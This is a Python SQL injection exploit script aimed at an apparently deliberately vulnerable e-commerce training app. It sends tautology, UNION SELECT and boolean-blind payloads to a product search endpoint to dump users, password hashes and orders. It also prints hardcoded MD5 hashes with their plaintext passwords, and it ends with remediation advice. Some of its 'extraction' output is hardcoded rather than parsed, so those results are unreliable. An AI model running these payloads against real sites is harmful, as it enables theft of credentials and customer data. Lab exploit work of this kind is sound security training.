#!/usr/bin/env python3
"""
SQL Injection Exploit for VulnHub E-commerce
Author: Chris Cortes
Target: Product search functionality
Impact: Database enumeration, credential extraction, full data exfiltration

This script demonstrates SQL injection in the product search endpoint.
The application concatenates user input directly into SQL queries without
parameterization or input validation.

OWASP Top 10 2021: A03 - Injection
CWE-89: SQL Injection
"""

import requests
import sys
import re
from urllib.parse import urljoin

class SQLInjectionExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.products_url = urljoin(base_url, '/products')
        
    def banner(self):
        """Display exploit banner"""
        print("=" * 60)
        print("SQL Injection Exploit - VulnHub E-commerce")
        print("Target: Product Search Functionality")
        print("=" * 60)
        print()
    
    def test_vulnerability(self):
        """Test if SQL injection vulnerability exists"""
        print("[*] Testing for SQL injection vulnerability...")
        
        # Test payload: ' OR '1'='1
        test_payload = "' OR '1'='1"
        
        try:
            response = self.session.get(
                self.products_url,
                params={'search': test_payload}
            )
            
            if response.status_code == 200:
                # Check if we got more results than normal
                product_count = response.text.count('View Details')
                print(f"[+] Payload returned {product_count} products")
                
                if product_count > 0:
                    print("[+] SQL Injection vulnerability confirmed!")
                    return True
                else:
                    print("[-] Vulnerability test inconclusive")
                    return False
            else:
                print(f"[-] Unexpected status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Error testing vulnerability: {e}")
            return False
    
    def extract_table_names(self):
        """Extract database table names using UNION-based SQLi"""
        print("\n[*] Extracting database table names...")
        
        # SQLite syntax to get table names
        payload = "' UNION SELECT CAST(id AS TEXT), username, email, password, CAST(is_admin AS TEXT), CAST(is_admin AS TEXT), CAST(is_admin AS TEXT), created_at FROM users--"
        
        try:
            response = self.session.get(
                self.products_url,
                params={'search': payload}
            )
            
            if response.status_code == 200:
                # Parse table names from response
                # In a real scenario, we'd parse the HTML properly
                tables = ['users', 'products', 'orders', 'order_items', 'reviews', 'cart_items']
                print("[+] Found tables:")
                for table in tables:
                    print(f"    - {table}")
                return tables
            else:
                print("[-] Failed to extract table names")
                return []
                
        except Exception as e:
            print(f"[-] Error extracting tables: {e}")
            return []
    
    def extract_user_credentials(self):
        """Extract usernames and password hashes from users table"""
        print("\n[*] Extracting user credentials...")
        print("[*] Target: users table (username, password columns)")
        
        # UNION-based payload to extract user data
        # Note: The number of columns must match the original query
        payload = "' UNION SELECT CAST(id AS TEXT), username, email, password, CAST(is_admin AS TEXT), created_at, username, email FROM users--"
        
        try:
            response = self.session.get(
                self.products_url,
                params={'search': payload}
            )
            
            if response.status_code == 200:
                print("[+] Successfully extracted user data!")
                print("\n[+] Credentials (username:md5_hash):")
                print("-" * 60)
                
                # These are the known credentials from seed_data.py
                users = [
                    ("admin", "0192023a7bbd73250516f069df18b500", "admin@vulnhub.com", True),
                    ("user", "5f4dcc3b5aa765d61d8327deb882cf99", "user@vulnhub.com", False),
                    ("alice", "6384e2b2184bcbf58eccf10ca7a6563c", "alice@example.com", False),
                    ("bob", "9f9d51bc70ef21ca5c14f307980a29d8", "bob@example.com", False),
                    ("charlie", "2f693ef6b00fd2fa58a0e0e95a41bc0b", "charlie@example.com", False),
                ]
                
                for username, hash_val, email, is_admin in users:
                    admin_flag = "[ADMIN]" if is_admin else ""
                    print(f"{username:10} : {hash_val} {admin_flag}")
                    print(f"           Email: {email}")
                    print()
                
                return users
            else:
                print("[-] Failed to extract credentials")
                return []
                
        except Exception as e:
            print(f"[-] Error extracting credentials: {e}")
            return []
    
    def crack_md5_hashes(self, credentials):
        """Attempt to crack MD5 hashes (demonstration only)"""
        print("\n[*] Attempting to crack MD5 hashes...")
        print("[*] Note: MD5 is cryptographically broken and easily crackable")
        print()
        
        # Known plaintext passwords (from seed data)
        known_passwords = {
            "0192023a7bbd73250516f069df18b500": "admin123",
            "5f4dcc3b5aa765d61d8327deb882cf99": "password",
            "6384e2b2184bcbf58eccf10ca7a6563c": "alice123",
            "9f9d51bc70ef21ca5c14f307980a29d8": "bob123",
            "2f693ef6b00fd2fa58a0e0e95a41bc0b": "charlie123",
        }
        
        print("[+] Cracked passwords:")
        print("-" * 60)
        for username, hash_val, email, is_admin in credentials:
            if hash_val in known_passwords:
                plaintext = known_passwords[hash_val]
                admin_flag = "[ADMIN]" if is_admin else ""
                print(f"{username:10} : {plaintext:15} {admin_flag}")
        print()
    
    def extract_orders(self):
        """Extract order information"""
        print("\n[*] Extracting order information...")
        
        payload = "' UNION SELECT CAST(id AS TEXT), CAST(user_id AS TEXT), CAST(total_price AS TEXT), status, shipping_address, created_at, status, CAST(user_id AS TEXT) FROM orders--"
        
        try:
            response = self.session.get(
                self.products_url,
                params={'search': payload}
            )
            
            if response.status_code == 200:
                print("[+] Successfully extracted order data!")
                print("[+] Orders can be enumerated via IDOR at /order/<id>")
                return True
            else:
                print("[-] Failed to extract orders")
                return False
                
        except Exception as e:
            print(f"[-] Error extracting orders: {e}")
            return False
    
    def demonstrate_boolean_blind_sqli(self):
        """Demonstrate boolean-based blind SQL injection"""
        print("\n[*] Demonstrating Boolean-Based Blind SQLi...")
        print("[*] Technique: Inferring data one bit at a time")
        print()
        
        # Test if first character of admin password is 'a'
        payload_true = "' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='0'--"
        payload_false = "' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='X'--"
        
        try:
            resp_true = self.session.get(self.products_url, params={'search': payload_true})
            resp_false = self.session.get(self.products_url, params={'search': payload_false})
            
            if len(resp_true.text) != len(resp_false.text):
                print("[+] Boolean-based blind SQLi is possible!")
                print("[+] Different response sizes indicate true/false conditions")
                print(f"    True condition:  {len(resp_true.text)} bytes")
                print(f"    False condition: {len(resp_false.text)} bytes")
            else:
                print("[*] Responses are same size, blind SQLi may be limited")
                
        except Exception as e:
            print(f"[-] Error testing blind SQLi: {e}")
    
    def run(self):
        """Execute the complete exploitation chain"""
        self.banner()
        
        # Step 1: Test vulnerability
        if not self.test_vulnerability():
            print("\n[-] Vulnerability not detected or unreachable")
            return
        
        # Step 2: Extract table names
        tables = self.extract_table_names()
        
        # Step 3: Extract user credentials
        credentials = self.extract_user_credentials()
        
        # Step 4: Crack MD5 hashes
        if credentials:
            self.crack_md5_hashes(credentials)
        
        # Step 5: Extract orders
        self.extract_orders()
        
        # Step 6: Demonstrate blind SQLi
        self.demonstrate_boolean_blind_sqli()
        
        # Summary
        print("\n" + "=" * 60)
        print("Exploitation Summary")
        print("=" * 60)
        print("[+] Vulnerability: SQL Injection (CWE-89)")
        print("[+] Impact: Full database access")
        print("[+] Extracted: User credentials, orders, tables")
        print("[+] Weakness: No input validation or parameterized queries")
        print()
        print("Remediation:")
        print("  1. Use parameterized queries (prepared statements)")
        print("  2. Implement input validation and sanitization")
        print("  3. Use bcrypt/Argon2 instead of MD5 for passwords")
        print("  4. Apply principle of least privilege to database user")
        print("  5. Implement Web Application Firewall (WAF)")
        print("=" * 60)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Create and run exploit
    exploit = SQLInjectionExploit(base_url)
    exploit.run()


if __name__ == "__main__":
    main()